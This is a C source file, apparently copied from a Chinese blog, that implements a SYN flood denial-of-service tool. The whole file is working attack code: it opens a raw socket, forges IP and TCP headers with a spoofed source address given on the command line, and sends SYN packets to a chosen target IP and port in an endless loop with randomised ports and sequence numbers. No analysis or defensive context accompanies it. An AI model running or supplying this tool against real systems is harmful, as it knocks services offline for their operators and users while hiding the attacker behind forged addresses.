/* SynFlooding.c
Author: form Internet
URL   : https://blog.csdn.net/weixin_34082789/article/details/92483214
*/

#include <sys/types.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <strings.h>
#include <stdio.h>
#include <stdlib.h>

unsigned short in_cksum(unsigned short *ptr, int nbytes);
int synflooding();
void sigint(int signo);
struct sockaddr_in target;
struct sockaddr_in pesudo;
int rawsock;

unsigned short in_cksum(unsigned short *addr, int len) {
	int sum = 0;
	unsigned short res = 0;
	while (len > 1) {
		sum += *addr++;
		len -= 2;
	}

	if (len == 1) {
		*((unsigned char *)(&res)) = *((unsigned char *)addr);
		sum += res;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	res = ~sum;
	return res;
}


void sigint(int signo) {
	printf("catch SIGINT\n");
	close(rawsock);
	exit(0);
}


int main(int argc, char *argv[]) {
	if (argc != 4) {
		printf("usage:%s psuedoip attackip attackport\n", argv[0]);
		exit(1);
	}

	if (inet_aton(argv[1], &pesudo.sin_addr) == 0) {
		printf("bad ip address:%s\n", argv[1]);
		exit(1);
	}

	if (inet_aton(argv[2], &target.sin_addr) == 0) {
		printf("bad ip address:%s\n", argv[2]);
		exit(1);
	}

	target.sin_port = htons(atoi(argv[3]));
	signal(SIGINT, sigint);
	synflooding();
	exit(0);
}


int synflooding() {
	int i, j, k;
	struct packet {
		struct iphdr ip;
		struct tcphdr tcp;
	}packet;

	struct pseudo_header {           /* For TCP header checksum */
		unsigned int source_address;
		unsigned int dest_address;
		unsigned char placeholder;
		unsigned char protocol;
		unsigned short tcp_length;
		struct tcphdr tcp;
	}pseudo_header;

	bzero(&packet, sizeof(packet));
	bzero(&pseudo_header, sizeof(pseudo_header));
	if ((rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		perror("socket()");
		exit(1);
	}

	packet.tcp.dest = target.sin_port; /* 16-bit Destination port */
	packet.tcp.ack_seq = 0; /* 32-bit Acknowledgement Number */
	packet.tcp.doff = 5; /* Data offset */
	packet.tcp.res1 = 0; /* reserved */
	/* packet.tcp.res2=0; reserved */
	packet.tcp.urg = 0; /* Urgent offset valid flag */
	packet.tcp.ack = 0; /* Acknowledgement field valid flag */
	packet.tcp.psh = 0; /* Push flag */
	packet.tcp.rst = 0; /* Reset flag */
	packet.tcp.syn = 1; /* Synchronize sequence numbers flag */
	packet.tcp.fin = 0; /* Finish sending flag */
	packet.tcp.window = htons(242); /* 16-bit Window size */
	packet.tcp.urg_ptr = 0; /* 16-bit urgent offset */
	packet.ip.version = 4; /* 4-bit Version */
	packet.ip.ihl = 5; /* 4-bit Header Length */
	packet.ip.tos = 0; /* 8-bit Type of service */
	packet.ip.tot_len = htons(40); /* 16-bit Total length */
	packet.ip.id = getpid(); /* 16-bit ID field */
	packet.ip.frag_off = 0; /* 13-bit Fragment offset */
	packet.ip.ttl = 255; /* 8-bit Time To Live */
	packet.ip.protocol = IPPROTO_TCP; /* 8-bit Protocol */
	packet.ip.check = 0; /* 16-bit Header checksum (filled in below) */
	packet.ip.saddr = pesudo.sin_addr.s_addr; /* 32-bit Source Address */
	packet.ip.daddr = target.sin_addr.s_addr; /* 32-bit Destination Address */

	packet.ip.check = in_cksum((unsigned short *)&packet.ip, 20);
	while (1) {
		/* set src port and ISN */
		packet.tcp.source = htons(1025 + rand() % 60000);
		packet.tcp.seq = 761013 + rand() % 100000;
		packet.tcp.check = 0;

		pseudo_header.source_address = packet.ip.saddr;
		pseudo_header.dest_address = packet.ip.daddr;
		pseudo_header.placeholder = 0;
		pseudo_header.protocol = IPPROTO_TCP;
		pseudo_header.tcp_length = htons(20);

		bcopy((char *)&packet.tcp, (char *)&pseudo_header.tcp, 20);
		packet.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32);
		sendto(rawsock, &packet, 40, 0, (struct sockaddr *)&target, sizeof(target));
	}

	return 0;
}
